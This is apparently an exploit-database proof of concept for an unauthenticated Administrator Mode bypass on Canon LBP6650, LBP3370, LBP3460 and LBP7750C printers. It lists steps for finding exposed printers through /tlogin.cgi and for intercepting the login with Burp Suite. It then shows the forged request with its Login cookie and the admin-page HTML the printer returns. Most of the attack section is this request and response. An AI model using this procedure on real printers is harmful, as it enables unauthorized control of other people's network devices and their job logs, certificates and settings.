# Exploit Author: [Huy Kha]
# Vendor Homepage: [http://global.canon.com]
# Software Link: [ Website ]
# Severity: High
# Version: LBP6650, LBP3370, LBP3460, LBP7750C
# Tested on: Mozilla FireFox
 
# Description : An issue was discovered on Canon LBP6650, LBP3370, LBP3460, LBP7750C printers.
It is possible for a remote (unauthenticated) attacker to bypass the Administrator Mode authentication without a password at any URL of the device that requires authentication.
 
 
 
# PoC :
Start searching for Canon LBP6650 ,LBP3370, LBP3460 printers.
You can recognize them with the /tlogin.cgi parameter, but the version is
also been displayed on the webinterface.
https://imgur.com/a/QE3GfLw
 
# Example :
 
1. Go to the following url: http://127.0.0.1/tlogin.cgi
2. Click on Administrator Mode
3. Intercept now the request with Burpsuite and click on &#039;Ok&#039;&#039; to login.
And forward the request till you get the &#039;&#039;/frame.cgi?page=DevStatus&#039;&#039;
parameter.
 
 
# Request :
 
GET /frame.cgi?page=DevStatus HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1/tlogin.cgi
Cookie: CookieID=1610705327:; Login=11
Connection: close
Upgrade-Insecure-Requests: 1
 
# Response :
 
HTTP/1.1 200 OK
Date: MON, 05 JAN 1970 16:35:57 GMT
Server: CANON HTTP Server
Content-Type: text/html
Content-Length: 5652
 
<html>
 
<head>
<meta http-equiv="content-type" content="text/html;charset=iso-8859-1">
<meta http-equiv="pragma" content="no-cache"/>
<meta http-equiv="cache-control" content="no-cache,no-store,max-age=0"/>
<meta http-equiv="expires" content="Thu 01 Jan 1970 00:00:00 GMT"/>
 
 
 
<script language="JavaScript">
document.write(&#039;<title>Remote UI <&#039;);
switch("DevStatus")
{
case "DevStatus":document.write(&#039;Status&#039;);break;
case "DevError":document.write(&#039;Error Information&#039;);break;
case "DevUtil":document.write(&#039;Utility Menu&#039;);break;
case "DevCtrl":document.write(&#039;Device Control&#039;);break;
case "DevCalib":document.write(&#039;Calibration&#039;);break;
case "DevInfo":document.write(&#039;Device Information&#039;);break;
case "DevInfoSetDev":document.write(&#039;Change Device Information&#039;);break;
case "DevInfoSetSecu":document.write(&#039;Change Administrator Settings&#039;);break;
case "DevInfoSetIpSecu":document.write(&#039;Change IP Address Range&#039;);break;
case "DevInfoSetIpv6Secu":document.write(&#039;Change IP Address Range&#039;);break;
case "DevInfoSetMacSecu":document.write(&#039;Change Receiving Permitted MAC
Address&#039;);break;
case "DevInfoSetRuiSecu":document.write(&#039;Change Remote UI Setting&#039;);break;
case "KeyManageSet":document.write(&#039;Key and Certificate&#039;);break;
case "KeyManageDetail":document.write(&#039;Certificate Details&#039;);break;
case "KeyManageNewKey":document.write(&#039;Generate Key and Certificate&#039;);break;
case "KeyManageNewCert":document.write(&#039;#&Title_KeyManageNewCert&#039;);break;
case "KeyManageKeyInst":document.write(&#039;Install Key and Certificate&#039;);break;
case "KeyManageKeyPasswd":document.write(&#039;Enter Private Key
Password&#039;);break;
case "CaManageSet":document.write(&#039;CA Certificate&#039;);break;
case "CaManageDetail":document.write(&#039;Certificate Details&#039;);break;
case "CaManageKeyInst":document.write(&#039;Install CA Certificate&#039;);break;
case "JobHistory":document.write(&#039;Job Log Display&#039;);break;
case "DevFeature":document.write(&#039;Features&#039;);break;
case "DevNetwork":document.write(&#039;Network&#039;);break;
case "DevNetworkSetTcpip":document.write(&#039;Change TCP/IP Settings&#039;);break;
case "DevNetworkSetNetware":document.write(&#039;Change NetWare Settings&#039;);break;
case "DevNetworkSetApTalk":document.write(&#039;Change AppleTalk
Settings&#039;);break;
case "DevNetworkSetSMB":document.write(&#039;Change SMB Protocol
Settings&#039;);break;
case "DevNetworkSetNetIF":document.write(&#039;Change Ethernet Driver
Setting&#039;);break;
case "DevNetworkSetSNMP":document.write(&#039;Change SNMP Settings&#039;);break;
case "DevNetworkSetSNMPV3User":document.write(&#039;User Settings&#039;);break;
case "DevNetworkSetSNMPV3ConText":document.write(&#039;Context Settings&#039;);break;
case "DevNetworkSetSNMPV3ConTextSet":document.write(&#039;Context
Settings&#039;);break;
case "DevNetworkSetSpool":document.write(&#039;Change Spooler Setting&#039;);break;
case "DevNetworkSetNWakeUp":document.write(&#039;Change Startup Time&#039;);break;
case "DevNetworkParList":document.write(&#039;Parameter List&#039;);break;
case "DevNetworkFactDef":document.write(&#039;Initialize Network
Settings&#039;);break;
case "DevNetworkSetEmail":document.write(&#039;Change E-mail Print
Settings&#039;);break;
case "EmailRecv":document.write(&#039;Receive E-mails&#039;);break;
case "DevIDControl":document.write(&#039;Department ID Management&#039;);break;
case "DevIDSetting":document.write(&#039;Department ID Management&#039;);break;
case "DevIDRegist":document.write(&#039;Department ID Management&#039;);break;
case "DevIDEdit":document.write(&#039;Department ID Management&#039;);break;
case "DevCount":document.write(&#039;Counter Check&#039;);break;
case "JobPrtProp":document.write(&#039;Print Job Details&#039;);break;
case "JobPrtSecure":document.write(&#039;Unlock&#039;);break;
case "JobStore":document.write(&#039;Stored Job&#039;);break;
case "JobStoreList":document.write(&#039;#&Title_JobStoreList&#039;);break;
case "JobStoreEnterPwd":document.write(&#039;Enter Password&#039;);break;
case "JobStoreProp":document.write(&#039;Stored Job Details&#039;);break;
case "JobStoreExec":document.write(&#039;Print Stored Job&#039;);break;
case "JobStoreBoxProp":document.write(&#039;Change Box Settings&#039;);break;
case "JobLog":document.write(&#039;Print Log&#039;);break;
case "EmailLog":document.write(&#039;E-mail Receive Log&#039;);break;
case "PdfPrint":document.write(&#039;Direct Print&#039;);break;
case "PsPrint":document.write(&#039;Direct Print&#039;);break;
case "ImgPrint":document.write(&#039;Direct Print&#039;);break;
case "CfgCtrl":document.write(&#039;Control Menu&#039;);break;
case "CfgCtrlSet":document.write(&#039;Change Control&#039;);break;
case "CfgCtrlTimeSet":document.write(&#039;Change Date and Time&#039;);break;
case "CfgPaper":document.write(&#039;Paper Source Menu&#039;);break;
case "CfgPaperSet":document.write(&#039;Change Paper Source&#039;);break;
case "CfgLayout":document.write(&#039;Layout Menu&#039;);break;
case "CfgLayoutSet":document.write(&#039;Change Layout&#039;);break;
case "CfgQuality":document.write(&#039;Quality Menu&#039;);break;
case "CfgQualitySet":document.write(&#039;Change Quality&#039;);break;
case "CfgUserMainte":document.write(&#039;User Maintenance Menu&#039;);break;
case "CfgUserMainteSet":document.write(&#039;Change User Maintenance&#039;);break;
case "CfgExpCard":document.write(&#039;Extension Card&#039;);break;
case "SupLink":document.write(&#039;Support Links&#039;);break;
case "SupLinkSet":document.write(&#039;Edit Support Links&#039;);break;
case "Debug":document.write(&#039;Debug&#039;);break;
case "Syslog":document.write(&#039;System Log&#039;);break;
default:document.write(&#039;&#039;);break;
}
document.write(&#039;> : LBP6650 ; LBP6650</title>&#039;);
 
var url = new String(document.location);
var ssl = "0";
if( ssl == &#039;1&#039;)
{
    if(url.match("https") == null )
    {
document.location.href = "blank.html";
    }
}
 
</script>
 
</head>
 
<frameset cols="185,*" frameborder="NO" border="0" framespacing="0" >
<frame src="/menu.cgi?Type=DEVICE" marginwidth="8" marginheight="0"
name="Index" noresize scrolling="NO">
<frame src="/dstatus.cgi" name="Body">
</frameset>
<noframes>
<body>
</body>
</noframes>
 
</html>
 
 
 
# Do we have now access to the printer with Admin Mode? : Yes
 
# How to fix this? : Remove the default password and add a new (strong) password.
 
 
# Screenshot : https://imgur.com/a/ISDL1Qf (Administrator Mode)

